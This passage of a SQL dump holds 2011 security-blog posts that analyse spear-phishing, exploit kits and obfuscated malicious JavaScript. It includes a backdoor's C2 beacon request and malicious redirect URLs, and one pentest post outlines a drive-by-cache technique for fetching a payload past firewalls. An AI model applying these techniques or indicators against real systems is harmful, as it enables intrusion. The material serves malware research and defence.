out.\n\nThe author of the script created two layers of obfuscation so you have to decrypt the set of hex and octal characters you see at the “jt72D2Tp1BN” variable. You’ll find that this does the actual deobfuscation and then does a document.write to render the HTML form you saw earlier. Our hack involves redirecting the HTML code into a textarea box so we can see the code and not have it rendered.\n\nAnd here you go…', 'phish', 'http://www.kahusecurity.com/?p=6337\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (119, 'APEC SpearPhish', 'sectek', 'November 9, 2011', 'I was asked (and given permission) to publish this…..\nOVERVIEW\nA suspicious email was received on 10/26/2011 and targeted a single, key individual in the organization.  The sender appeared to be from a Hawaii-based real estate company.\nThe email was identified as a spear-phish as it contained a malicious PDF file attachment:\n\nWhen the PDF file is opened, it looks like this:\n\nThe email header shows that the email originated from Google Mail and was not spoofed.  The purported sender is “Christy Serrato” who has been linked to other targeted spear-phish attacks in the past as seen below.  Security researchers who analyzed these attacks have attributed them to China.\n\nThe PDF file attachment contains a Flash object that exploits an Adobe Flash Player vulnerability.  If successful, malware is then installed on the user’s computer without any warning.  Here’s a description of the vulnerability:\nCVE-2011-0609 – Unspecified vulnerability in Adobe Flash Player 10.2.154.13 and earlier on Windows, Mac OS X, Linux, and Solaris; 10.1.106.16 and earlier on Android; Adobe AIR 2.5.1 and earlier; and Authplay.dll (aka AuthPlayLib.bundle) in Adobe Reader and Acrobat 9.x through 9.4.2 and 10.x through 10.0.1 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via crafted Flash content, as demonstrated by a .swf file embedded in an Excel spreadsheet, and as exploited in the wild in March 2011.\nThe malicious PDF file, when scanned against 43 different anti-virus products, can only be detected by 8 of them:\n\nThe malware that runs on the user’s computer is a backdoor program.  This program tries to communicate with a remote website which gives the remote attacker the ability to perform the following actions on the affected computer:\n* Download/upload files\n* Execute arbitrary files\n* Execute remote commands\n* Delete arbitrary files\n* Terminate processes\n* List running processes\n* List folders for files\n* Sleeps the computer for a specified time\n* May install modified copy of “cmd.exe” with the name specified by the\nremote attacker\nThe backdoor program, when scanned against 43 different anti-virus products, can only be detected by 9 of them:\n\nThe web server that the backdoor program communicates with, dot.faawan.com (216.134.230.120), appears to be located in Arkansas, USA and has a clean reputation, however, all of the name servers supporting the domain are located in various cities in China.\n\nSequence of events:\n\nTECHNICAL DETAILS\nThe email originated from Google Mail and was not forged:\n\nThe PDF file details and results of a VirusTotal scan:\nFile: The Future Redefined-2011 APEC CEO Summit.pdf\nMD5: 3d91d9df315ffeb9bb1c774452b3114b\nSize: 433140\nVirusTotal Results: 8 of 43 (18.6%)\n\nThe PDF file contains an embedded Flash file:\n\nThe Flash file details and results of a VirusTotal scan:\nFile: stream.swf\nMD5: a9fa49ea3b11baecfc4a593607faa37b\nSize: 15914\nVirusTotal Results: 8 of 43 (18.6%)\n\nThe decompiled Flash file shows the CVE-2011-0611 exploit code:\n\nWhen the PDF file is opened, the Flash file containing the exploit code executes and drops two files onto the computer in the “%userprofile%\\local settings\\temp” folder.\nThe first file is a blank PDF file called “The Future Redefined-2011 APEC CEO Summit.pdf” that automatically opens when Acrobat crashes due to the exploit.\nHere we can see the PDF maker of this file:\n\nThe second dropped file is an executable called “A3DUtility.exe”.  Here are details of the program and results from VirusTotal:\nFile: A3DUtility.exe\nMD5: 4b873858b58be4b47013545420f27759\nSize: 385024\nVirusTotal Results: 9 of 43 (20.9%)\n\nThe program is referenced as “Ixeshe”, variant “E” by Microsoft.\nBackdoor: Win32/Ixeshe.E\nReport Published: May 13, 2011\nSummary: Ixeshe.E is a backdoor trojan that allows remote access and control of a computer. In the wild, this trojan is known to be dropped by malicious SWF files.\nThe program’s file attribute is set to hidden.  A shortcut is created in the Startup folder that launches this program automatically and silently during every startup.\n\nThe backdoor program was made to look like an existing, legitimate component of Adobe Acrobat.\n\nThe backdoor program can be seen running in Task Manager.  When the program runs, it attempts to communicate with a remote server on port 443 then waits for instructions.  Port 443 is normally used with the SSL protocol but in this case, no encryption is used (the URL parameters do appear to be encoded).\nGET /AWS28019.jsp?PSq22oB5gr5oQvDwTsnJgrl8UaZSxRVYPsUcGjF2GjZoPr/qgspwPrVFPaZN/SnrxRpqGjZFTrK7=oH32b5wPI27=hTL=aYdQ4vV=M9Bph7k=N2BQhvo0aLKQipFP8yMPs7r HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\nHost: dot.faawan.com\n\nIf the web page is not found, the program retries a few more times and then increments the numeric portion of the web page name and tries again.  The program systematically tries to find a valid web page performing several HTTP GET requests per second, presumably until a web page is found and the proper response is received.\n\nInformation about the host names:\n\nThe reputation of the remote server at 216.134.230.120:', 'apec, spear-phish, spearphish', 'http://www.kahusecurity.com/?p=6038\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (120, 'Two Drive-Bys, One Site', 'darryl', 'October 27, 2011', 'It’s bad enough to get hit with one drive-by download…but two on one page?! It’s probably separate compromises made by two different people. One thing is for sure though…what’s common to all these websites is WordPress. Let’s take a look at the first drive-by. Here are some of the affected websites:\n\nThe HTML source code reveals the tampering. Since the webpage injections are all the same on these sites, it could be an automated script.\n\nHere’s what the above Javascript looks like when it’s decompressed. Other domains being used all seem to begin with “dr”.\n\nWhen this page is called, it keeps track of the visitors and then does a 302 redirect to a malicious site.\n\nHere’s what’s waiting for you when you arrive on that website.\n\nWhen you deobfuscate that mess, it looks to be compromising your system with the expected cocktail of Java, Acrobat, and Flash exploits. It looks like Best Pack just got updated!\n\nLet’s go back to the original website now and go over the second drive-by…\nHere we see about a third of the ways down a crafty onerror function that creates an iframe to the second malicious site.\n\nHere’s the obfuscated script that appears to reveal a bit about the exploits being used.\n\nAt the bottom of the script, an external Javascript is called that gets all this going.\n\nAgain, it’s a mix of Java, Acrobat, and Flash exploits. This looks to be a new pack.\n\nThe third set of URLs lead to some kind of search redirection scam which pales next to the drive-bys. Anyway, here’s a summary of the malicious HTTP requests.', 'best pack, drive-by, obfuscated javascript', 'http://www.kahusecurity.com/?p=5250\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (121, 'Neosploit is Back!', 'darryl', 'October 26, 2011', 'After a long hiatus, it appears that Neosploit may have come back to life! While the code has some slight changes, it functions similarly to previously known versions of Neosploit so it’s doesn’t look like a major upgrade. I just can’t tell how widespread this is but I think we can all agree that it did make a pretty big impact awhile ago before Black Hole became a dominant player in the attack toolkit space.\nHere’s the website that is hosting the link to the exploit pack:\n\nThe website’s source code reveals the malicious redirect script.\n\nWhen you clean up the code, it looks like this:\n\nInterestingly, the redirect script above employs a similar obfuscation method used by Neosploit. Both scripts contain a common function that decrypts strings sent to it. If you can monitor that function, you can extract the resulting script after it gets decrypted.\nThe redirect script above calls upon an external script which triggers the infection process. Here are the URL formats:\nwebsite/ftfpckzxwj4sg7g3/\nwebsite/468cc5ed9bfac20f8b2df382c08942f83869zxw\nwebsite/osnp91icm/?5\nwebsite/osnp91icm/?256a9d86bde5afd64251505a0c5f0e030204035a0d06080d0650575600530f03\nwebsite/osnp91icm/?2ace17a0a7c1b25c5800115e040c57050250565e0555510b0604025208005605\nwebsite/osnp91icm/?0ff3a2f348f12d565a120b085409500600575308555056080403070458055106\nIf you’ve been tracking Neosploit, you’ll notice that the URL formats look familar. Here’s another familiar item, the obfuscation method:\n\nThat “run” function you see is the main decryptor which is what previous versions of Neosploit was known to use. There’s slight changes here and there probably meant to get past IDS and AV. The exploits used are similar to previous versions with Java leading the way followed by Acrobat.', 'neosploit, obfuscated javascript', 'http://www.kahusecurity.com/?p=5187\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (122, 'Elaborate Black Hole Infection', 'darryl', 'October 22, 2011', 'I normally come across straight-forward drive-by downloads. Due to some website compromise, a web page is modified to include a link to a malicious website (e.g. iframe or external Javascript file) that infects unsuspecting visitors. In this case, the infection method was rather elaborate and lucky for me, I got the rare chance of seeing what goes on behind the scenes.\nHere’s the index.html file which shows a series of calls to external Javascript files. All of these files are legitimate and used on this site. However, the “coin-slider.js” file was modified for nefarious purposes.\n\nAt the very top of the JS file is a strange glob of values preceeded by document.writes. They look like hex.\n\nAfter we convert the hex values to text, we get this. It’s calling an external Javascript file from another part of the website.\n\nHere’s what that Javascript file looks like. Ugh, it’s a mess!\n\nAfter going through the script, we can see that it checks for a cookie value to prevent whacking the same client twice. Then it attaches an iframe to the body tag. We can cheat and insert an alert in the right place to see the URL being called.\n\nHere’s the malicious link:\n\nThis eventually leads to Black Hole Exploit Kit so we know the rest of the story. However, there’s one more chapter to add. I was fortunate to be able to obtain the PHP file. Let’s have a look at it!\n\nThey’ve certainly obfuscated the contents to prevent the website administrator from knowing what it does. This is an array of characters which are concatenated together. At the very bottom, you can see two key functions it performs to turn this gibberish into script.\n\nSneaky! After it does that then it evals the result. If we change that to ‘echo’ then we can see the deobfuscated script.\n\nIt creates a huge array then joins pieces of them together. Besides hiding from spiders, it creates a folder called “.svn” and does a GET with a specific user-agent string to another website then writes it to a file in the folder. \n\nThe downloaded content changes every so often with a new URL. This ensures the visitor will be redirected to the latest Black Hole host.\n\nThe PHP code converts this text from Base64 to text and is loaded into the page which we know is Javascript code from above.\n\nI think this highlights rather nicely the lengths criminals go to in order to hide their links and motives.', 'black hole, drive-by, obfuscated javascript', 'http://www.kahusecurity.com/?p=4860\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (123, 'Malware Infection from New Exploit Pack', 'darryl', 'October 8, 2011', 'A popular movie website appears to be infecting unsuspecting visitors’ computers. Thanks to reader Jonathan who found this particular drive-by download and let me know about it!\n\nThe malicious redirect code does not appear in all visits (approximately 1 of 4 visits or so).\n\nWhen the code does appear, it’s a wretched piece of work!\n\nIt’s actually not too bad once you clean it up. The top part assigns values to three-character variables.\n\nThe bottom part of the script joins variables together based on the outcome of a series of math-based if-then-else. This is string splitting at its best/worst.\n\nOne of the best ways I found to deal with this is to use Firebug or a debugger since it will enumerate all of the variables used in a script. Let’s try Firebug first. The variable “zGz” shows something interesting but it’s not complete.\n\nLooking at other values I see something even more interesting…hmmm, countermeasures!\nVwv = “chrome://firebug/content/”\npUO = “chrome://jsdeobfuscator/content/”\nOkay, so now let’s use a debugger. You can see we’ll get similar results.\n\nBut this time, we can extract the full, deobfuscated code.\n\nBeautifying the code, leaves us with this. The code checks the browser and cookie and depending on the results, inserts an iframe to a malicious site.\n\nNow that we know where we are being redirected to, let’s take a look at the exploit code that hits our browsers when we visit the site.\n\nAfter reversing this code, we end up with this…another layer of obfuscation which uses a compression technique many of you are familiar with.\n\nWe finally get to the deobfuscated code. The complete source can be found on Pastebin with another domain.\n\nThis pack is using classic exploits that attack IE (MDAC), PDF, and Java.', 'javascript, obfuscated', 'http://www.kahusecurity.com/?p=4137\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (124, 'Wild Wild West – 10/2011', 'sectek', 'October 1, 2011', 'added “Nuclear Pack” to most wanted section.  there’s several new packs out there but i don’t have their names.  please send me screenshots or packs at: sectek at live dot com', '', 'http://www.kahusecurity.com/?p=3857\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (125, 'Deobfuscating BreakingPoint’s JS Challenge', 'darryl', 'September 17, 2011', 'Now that the BreakingPoint Systems contest is over and since several of you wanted to know how I did it, here’s an overview. First off, when I approached this, I just wanted to solve the puzzle as quickly as I could. If I couldn’t figure it out fast then I would go back to the beginning and read through and decode each line of code. But thankfully, I was able to solve it the quick way…\nLet’s take a look at a cleaned up version of BreakingPoint’s obfuscated Javascript:\n\nThe script starts off by checking your user-agent string. Depending on your browser, it will return a value/key which is used to try to decrypt the chunk of decimal, hex, and octal values at the bottom of the script.\n\nWhat was initially tricky was figuring out what these “toString” values were. Here’s one of the first statements I encountered. If you run this on your browser, you’ll see what this means:\nalert(720094129..toString(1<<5));\nThis converts to \"length\". So this if-then statement:\n(uUHIjMJVFJET.indexOf(523090424..toString(1 << 5) + \"x\") != -\'c\' [720094129..toString(4 << 3) + \"\"])\nCan be translated to:\n(uUHIjMJVFJET.length != -\'c\' [length])\nHalf-way through the script, there\'s a function that decodes the string of values at the bottom. You can see the function in the screenshot above. You will also see there\'s another \"toString\" statement with a value of 490837 (center of screenshot). When you alert on this, you\'ll see that this converts to \"eval\".\nSo at this point, I had a good idea of what I wanted to try. I could have used different browsers or used a user-agent spoofer but instead I thought I would just brute-force this by stripping off everything and passing the return values for each browser until I got the right key. And to deal with that obfuscated \"eval\" statement, I initially tried replacing it with \"alert\" but since that didn\'t work, I just base-converted \"alert\" to a decimal value of 11189117 and stuck that there. Here\'s what the script looked like after my modifications:\n\nI tried the IE browser’s return statement but that didn’t work. Next I tried the Firefox’s return statement and bingo!\n\nI noticed “body.appendChild” in the script so I added some body tags to the document. I also saw “.write” at the end so I took a closer look at that statement and noticed a “\nThen I executed the script and watched what it did.\n\nThe script spewed a bunch of strange looking HTML tags over and over until IE cried “uncle”. I noticed that the tags at the beginning had “audio” in it. Scrolling down, it then changed to “a” then to “base” and then repeated itself many times. I searched for this pattern in Google and eventually found a little known Firefox exploit. This part took longer than the actual deobfuscation. So there you have it! It was fun and quite a nice challenge they put together!\nHow did you deobfuscate it?', 'breaking point, contest, javascript obfuscation, tostring', 'http://www.kahusecurity.com/?p=3292\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (126, 'Brilliant Javascript Obfuscation Technique', 'darryl', 'September 11, 2011', 'One of the guys over at BreakingPoint Systems detailed a cool, new Javascript obfuscation technique. You can click here to view his blog post.\nThe technique he described is based on Javascript’s toString method and a base 36 radix. For those of you who don’t know, the toString function allows you to convert a number object into a string. Here’s an example:\n\nWhat I didn’t know was that you can do this with it:\n\nIsn’t that clever?! With this technique, you can hide key functions like “eval” in plain sight!\nNow that you know how this technique works, you can practice what you’ve learned in a Javascript obfuscation contest. BreakingPoint will be giving you a chance to win an iPad if you can deobfuscate their script. You have until September 14, so get cracking! Here’s the link to their contest!\nBy the way, their obfuscated script is pretty challenging. You can crack it with a debugger but notepad and IE works just fine too.\nUpdate (5/21/16): Greek translation provided by Nikolaos Zinas\nUpdate (2/27/17): Estonian translation provided by Arija Liepkalnietis', 'breakingpoint contest, javascript obfuscation, tostring', 'http://www.kahusecurity.com/?p=3033\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (127, 'Unknown Exploit Pack Gets Updated', 'darryl', 'September 8, 2011', 'I tracked this exploit pack back in November. Several months later, the pack re-emerged but seemed to have been updated.\nThis is what the obfuscated Javascript looked like back then. The top part had this gibberish, the middle section contain a lot of arrays, and at the end, the Javascript code concatenated the parts after doing some XOR’ing. Back then, it used PDF, Java, Real, HCP, and WMV exploits.\n\nHere’s what it looks like this time around. It looks familiar.\n\nThe middle section contains variables instead of arrays. The bottom portion was the script that converted that middle section to another set of Javascript code.\n\nThis new code decrypted the gibberish up at the top. Just paste that portion onto the bottom like so:\n\nNow you can get to see the final code which contains the exploits.\n\nUnfortunately, I wasn’t able to grab these other files to see exactly which exploits were being used but since there was a lot of code overlap from the previous version, I’m sure most are the same.\nHere’s the login screen to the panel.\n\nAnyone know what pack this is?', 'exploit kit, javascript obfuscation', 'http://www.kahusecurity.com/?p=2944\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (128, 'Wild Wild West – 09/2011', 'sectek', 'September 1, 2011', 'added Micro-Pack Exploit System and Punchy-Pack Exploit System', '', 'http://www.kahusecurity.com/?p=2698\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (129, 'Converter Tool Released', 'darryl', 'August 27, 2011', 'I’ve received a ton of requests for the Converter tool. I use this tool a lot to help me analyze and reverse obfuscated Javascript (among other things) and I hope you will find it useful yourself.\n\nI haven’t encountered any major bugs but it doesn’t mean it doesn’t exist.  This software is being made available as-is without any warranties. The original executable is 1.34MB so I packed it with UPX down to 65KB and as a result, it may trigger some AV (VirusTotal does show three hits but it’s not at all malicious; Anubis confirms this). If you are worried, analyze it in a VM or simply don’t use it.\nIf you have requests or found bugs, I’ll try to look at them but no promises. I have quite enough on my plate as it is!\nDownload: http://www.mediafire.com/?5dz26rqx5qcac3e\nMD5: 33e8c227764148440e5729c599c989f2', '', 'http://www.kahusecurity.com/?p=2444\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (130, 'A Tricky Obfuscated JavaScript', 'darryl', 'August 26, 2011', 'A reader sent in obfuscated Javascript code that he needed some help to decipher. I’m sure he was very close to solving it but it looked interesting enough that I thought I would have a go at it and detail how I deobfuscated it.\nIf you search for certain parts of the script, you’ll find the complete version here which was uploaded to Pastebin back on June 8, 2011.\n\nThis is a very long script but basically it decrypts obfuscated code and then attaches the resulting script to the DIV containers that you see at the top of the page. All of the functions call one routine to deobfuscate and another to attach itself to the DIV. Since this is such a long piece of code, I won’t go through it all but instead step through the main deobfuscation routine and then show you how to get to the decrypted exploit code in one pass.\nThe deobfuscation function is called “fez” and it’s a rather clever routine actually. To call it, the script passes two arguments over to it, a string of characters and a number. Let’s look at an example:\n hoe = ‘efB58194A8onn871k0L02U’;\npus = 16;\nluv = fez(hoe, pus);\nHere’s the function in question (I’ve included the input field which I’ll explain why in a minute);\n\nThe first part of the function defines some variables. There’s an eval statement which assigns the document object to a variable. This is here to break tools that can’t handle “evals”. Next comes the first of two for-loops.\nThis routine will loop through the length of variable “hoe” that we passed to variable “l”. It then gets the character at position 0 of “hoe” which is “e”. The letter “e” is then searched for in the decryption key. Where’s the key? It’s the value of the hidden input field up at the top. The result is “20” because the letter “e” is at the 20th position. The value 20 is then added to the value we first passed to this function which is 16 (the “pus” variable).\n20 + 16 = 36 and 36 mod 31 (which is the length of the key) is 5 (which is held now in variable “a”). It then looks up the 5th position of the key and gets that character which is “6”. Keep looping until you’re done and you’ll end up with this result: “6a617661456e61626c6564”\nNow we get to the second for-loop. This routine loops the length of “hoe” as well. The variable “v” gets assigned: 6a617661456e61626c6564[substr](s,q). The variable “s” is the number of times we’ve looped which is 0. The variable of “q” has been defined earlier as “2”. So this statement basically extracts the first two characters of the result which is “6a”. This hex value is then converted to decimal which is 106. And finally this decimal value is converted to text which is the letter “j”. Loop through the rest and you’ll get the final result of: “javaEnabled”\nWhew! But that was fun, wasn’t it?\nThe rest of the script works the same way and you just have to do it in segments and join the strings together to get the sum. If you’re impatient and want to see the whole thing then you need a way to trap the deobfuscated script up at the DIVs. Normally you can do it like this.\nChange this:\n<div id=”nun”></div>\nTo this:\n<textarea id=”nun”></textarea>\nThis works if the script attaches to the ID value of “nun” in this instance (e.g. getElementById). However, this script specifically looks for DIVs so this won’t work (e.g. getElementsByTagName). \nAfter fiddling a bit, I found a new way to do this (new to me anyway)…\nChange this:\n<div id=”nun”></div>\nTo this:\n<textarea div id=”nun”></textarea>\nHere’s how it looks before and after:\n\nAnd then when you run through the script, the deobfuscated script shows up in the respective text boxes:\n\nJust select and copy to Notepad so you can see the script in its entirety:\n\nThis method works great in Firefox and Chrome but not IE. For IE, you need to do it the old fashion way which is to loop through all the DIV tags then capture the innerHTML in a textarea like so:\n\nYou’ll end up with the same result above.\nThis looks like the work of an exploit pack, a new pack that I haven’t seen before. If anyone knows from which pack, I’d be very curious to find out.', 'obfuscated javascript', 'http://www.kahusecurity.com/?p=2442\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (131, 'Hacking Magazine Hacked', 'darryl', 'August 17, 2011', 'One of my favorite hacking resource site appears to be hacked and possibly even infecting visitors. Here’s the website:\n\nAnd here’s the offending code in the source:\n\nThe external Javascript file has obfuscated code:\n\nLet’s have a closer look at the obfuscated script but first let me clean it up:\n\nThis script basically concatenates groups of strings together after converting it from hex. Then it evals the result. If you convert the hex values to text, you can make out some of the final code.\n\nChanging “eval” to “alert” gives you the final code.\n\nHere are the pertinent HTTP requests:\nhttp://hakin9.org/\nhttp://hakin9.org/wp-includes/js/l10n.js?ver=20101110\nhttp://superpuperdomain2.com/frame.php\nhttp://global-traff.com/tds/in.cgi?5&user=mexx\nhttp://global-traff.com/ts/in.cgi?mexx\nhttp://global-traff.com/tds/in.cgi?18\nhttp://global-traff.com/empity.html\nI can’t seem to persuade it to give me a payload.  If anyone can, please let me know. In the meantime, let’s hope the guys over there can clean out their site quickly so we can get back to reading their zine safely.', 'hakin9 magazine, obfuscated javascript', 'http://www.kahusecurity.com/?p=2304\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (132, 'Drive-By Cache: Payload Hunting', 'darryl', 'August 11, 2011', 'The researchers over at Armorize identified a new technique some time ago called “drive-by cache” that kinda turns drive-by downloads on its head. You can read their analysis here.\nIn a typical drive-by download, the visiting PC gets compromised, the browser downloads the malware, and the malware executes. The malware is often times a downloader. When the downloader executes, it has to pass through the personal firewall and web filter in order to get the final payload. This behavior can be detected or blocked.\nAfter reading the write-up on the drive-by cache, I wondered if I could modify an existing drive-by download and apply this technique for an upcoming pentest I need to do. If I can get the payload onto the disk first, then I don’t need to worry about the firewall and web filter (for the initial infection anyway).\nSo here’s the plan:\n1) Download the payload to the browser cache\n2) Compromise the PC with an exploit\n3) Download the malware to the PC\n4) Execute the malware which will in turn execute the payload that’s in the cache\nIn step #4, the downloader won’t need to pull anything from the Internet because it’s already in the cache thanks to step #1. Great, let’s do this!\nIn step #1, the guys at Armorize described how it was done:\n<script src=”http://example.com/payload.jp2″></script>\nOkay so I add that to the head of the HTML page that contains the exploit. This gets the payload in the cache first followed by the exploit code. Now I create my staging malware to go to “Temporary Internet Files” and rename the payload file from “payload.jp2” to “payload.exe” and execute it.\nBig problem. The cache file is a special Windows folder and this won’t work. In fact, I ran across several stumbling blocks here. The article doesn’t mention the details so I need to work this through.\nWhen the payload file gets cached, you can see it in the “Temporary Internet Files” folder. \n\nHowever, the file is really sitting in a randomly named subfolder.\n\nAnd the filename’s been changed to “payload[1].jp2” to avoid overwriting existing files.\n\nWhat do I do? I don’t know where it’ll end up. And even if I do know where it is, renaming the file, executing the file, etc doesn’t work in this location. I have to revisit the plans and change it now to this:\n1) Download the payload to the browser cache\n2) Compromise the PC with an exploit\n3) Download the malware to the PC\n4) Execute the malware which will in turn execute the payload that’s in the cache\n4) Execute the malware which will search for the payload file in the cache\n5) Copy the file from the cache to the temp folder and rename it\n6) Execute the payload\nI write my “payload hunter” program which is the initial malware that gets dropped by the exploit then finds, copies, renames, and executes the payload without the firewall and web filter blocking the attempt. Success!', 'drive-by cache, malware, payload hunting, pentest', 'http://www.kahusecurity.com/?p=2236\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (133, 'Wild Wild West – 08/2011', 'sectek', 'August 1, 2011', 'added LinQ Sploit Pack, Death Pack, FlooP Pack, Underwater Exploit Pack, sprEaDEr, Ultra Lite Pack, Merry Christmas Pack & eCore Exploit Pack.  send me screenshots or kits at: sectek at live dot com', '', 'http://www.kahusecurity.com/?p=2114\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (134, 'Christmas (Pack) in July', 'darryl', 'July 14, 2011', 'Back in 2008, Dancho Danchev blogged about a Christmas-themed attack toolkit. This exploit pack was offered with three different types of licenses: Basic, Standard, and Professional with the latter enabling access to all of the exploits. A couple of years later, the author(s) appeared to have refreshed its available exploits.\nThanks to reader, CL-2011, who shared a copy of this hard-to-get pack with me which I quickly unpackaged and played with like it was an early Christmas present. This exploit pack is apparently called “Merry Christmas Pack”.\n\nTo the keen eye, you’ll quickly notice the title of the page, “Phoenix Exploit’s Kit”. Looking at the code, it appears to be a modification of PEK v2.3 with the obvious graphical content replacement as well as some code modifications.\nThis is the Javascript you get when you visit one of its infected webpages. You can see the obfuscated gibberish at the top followed by the deobfuscation script at the bottom.\n\nSimply replacing “eval” with “document.write” will get you the deobfuscated script.\n\nFrom what I could gather, here are the exploits it’s using which you’ll note is nearly identical to Phoenix version 2.3:\nCVE-2006-0003 – IE MDAC\nCVE-2007-5659 – PDF CollectEmailInfo\nCVE-2008-2463 – IE Snapshot\nCVE-2008-2992 – PDF Util.Print\nCVE-2009-0836 – PDF Open\nCVE-2009-0927 – PDF Collab\nCVE-2009-1869 – Flash10\nCVE-2009-3867 – Java GSB\nCVE-2009-4324 – PDF NewPlayer\nCVE-2010-0188 – PDF LibTiff\nCVE-2010-0806 – IE Peers\nCVE-2010-0886 – Java SMB\nCVE-2010-1297 – Flash NewFunction\nCVE-2010-1885 – HCP\nCVE-2010-2884 – Flash Code Exec\nCVE-2010-3654 – FlashPlayer Button', 'exploit kit, merry christmas pack, pek, phoenix exploit', 'http://www.kahusecurity.com/?p=1940\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (135, 'Wild Wild West – 07/2011', 'sectek', 'July 2, 2011', 'i moved things around based on the year of its appearance.', '', 'http://www.kahusecurity.com/?p=1747\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (136, 'Javascript Deobfucation Tools (Part 2)', 'darryl', 'June 25, 2011', 'In the previous article, I manually deobfuscated three malicious scripts. This time around, I’ll use publicly available tools to see which ones can tackle real-world obfuscated Javascript code.\nHere’s the criteria I used to select the tools:\n1. Free\n2. Windows-based\n3. Easy to setup and use (i.e. aimed at the novice user)\nThese are the tools I selected to test with:\n* Creme Brulee\n* Firebug – Firefox plug-in\n* Google Chrome Developer Tools\n* Javascript Deobfuscator – Firefox plug-in\n* JSDebug\n* Malzilla\n* Microsoft IE8 Developer Tools\n* Microsoft Script Debugger\n* Rhino\n* SpiderMonkey + V8\n* The Mina\nOther tools are available but I didn’t test them because I felt they didn’t meet the above criteria: Aptana Studio, Caffeine Monkey, DecryptJS, JSUnpack, Microsoft Script Editor, NJS Javascript Interpreter, Venkman, and Wully\nI’ll be using the same malicious Javascripts from the last time. Here’s a recap:\nRather straightforward obfuscation that inserts iframes into the page.\n\nUses DOM to attach a script to the webpage.\n\nHeavily obfuscated with two layers to peel off to get the browser exploits.\n\nCreme Brulee\nThis tool is able to handle simple obfuscated scripts but doesn’t do so well with others. Sometimes IE would hang as it tried to process a script.\n\n\n\nFirebug (FF plugin)\nFirebug deobfuscated all three scripts but the challenge was where to find the deobfuscated code. You may need to understand the malicious script a little bit to determine where the results will end up at.\nThe other challenge is to pause the page load so you can get to the deobfuscated script before a malicious redirect occurs and overwrites the variables.\n\n\n\nGoogle Chrome Developer Tools\nChrome has a debugger and an array of other tools built right in. Chrome was quickly able to tackle all three scripts and produce the deobfuscated scripts. This tool is arguably the most robust and flexible of them all. You may need to read through the scripts to find out which variables to look out for.\nApple’s Safari has a very similar developer tool (in terms of function and look) which is why I opted not to test it separately.\n\n\n\nJavascript Deobfuscator (FF plugin)\nThis plugin captures the scripts in its own window as Firefox executes them. This tool was the easiest to use because all you need to do is run this plug-in and hit the page with Javascripts on them. It was able to handle all three scripts without any user interaction (though it didn’t fully decrypt the second sample — only the URL was displayed).\nI did encounter some sluggishness and lock ups after processing multiple scripts but restarting Firefox fixed the problem.\n\n\n\nJSDebug\nThis is actually an external Javascript file you need to reference in the script you are analyzing. A separate popup shows what the eval caught. It’s a clever concept but it wasn’t able to deobfuscate all three scripts. I gave it a “partial” on the third script since it only deobfuscated the first of two evals.\n\n\n\nMalzilla\nMalzilla is a great program which gives you a lot of flexibility, options, and toolkits to help you deobfuscate Javascript. Malzilla experts can leverage this tool to crack very difficult scripts but I was only interested in getting quick access to the deobfuscated script and not have to fiddle with the options.\nOn the last script, only one of the two layers were decrypted. You could do some cutting and pasting at that point but I wanted simple and easy.\n\n\n\nMicrosoft IE8 Developer Tools\nThis tool is fairly easy to use but there needs to be some understanding of the script you are working with in order to find the best place to insert breakpoints. The DOM script was only partially deobfuscated.\n\n\n\nMicrosoft Script Debugger \nWhile not as flexible and powerful as IE8 Developer Tools, I did get the same results. And had the same challenge of finding where to place the breakpoints.\n\n\n\nRhino\nThis is a Java-based debugger that allows you to insert breakpoints to catch the deobfuscated values in the variables. As a result, you need to know a little something about the script you are trying to analyze.\n\n\n\nSpiderMonkey + V8\nSpiderMonkey for Windows works great on simple scripts, however, two of the scripts were too much. I also used Google’s V8 Javascript Engine as the backend which my colleague from KahuSecurity compiled for Windows. I ended up getting the same results.\nIn case you are interested, I included an external JS file which contains a one-liner seen below. This helps me to deobfuscate what I can (I still need to work on a method to take on DOM-based scripts). You can also just copy/paste this line to the top of the script you are trying to deobfuscate with SpiderMonkey or V8.\nfunction eval(zyxyz){print(zyxyz);}document={write:print};window={write:print};\n\n\n\nThe Mina\nMina appeared to have deobfuscated two of the three scripts but since the output is limited to exactly 1,000 bytes, the results were truncated. \nThis tool has a lot of potential. If the startup time was reduced and the output size increased, this would be on par with IE8 Developer Tools and Script Debugger in terms of results but easier to use because you don’t have to worry about breakpoints. The C++ source code is available so if anyone wants to make a new version, I’d love to do more testing.\n\n\n\nHere are the final results:\n\nThe results are hardly conclusive since the sample was just too small but it should give you some idea of which tools you might want to consider playing with or testing further. There probably won’t be a perfect tool that can deobfuscate everything ever created but there may be a couple of 